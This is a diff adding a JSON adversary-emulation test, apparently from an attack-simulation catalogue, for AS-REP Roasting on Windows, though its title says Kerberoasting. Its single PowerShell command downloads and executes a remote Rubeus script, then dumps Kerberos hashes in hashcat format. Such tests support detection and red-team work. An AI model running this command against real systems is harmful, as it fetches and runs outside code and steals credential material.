@@ -1,0 +1,23 @@
+{
+    "name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus",
+    "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1558.004",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "AS-REP Roasting",
+    "source": "ART",
+    "uuid": "8c385f88-4d47-4c9a-814d-93d9deec8c71",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
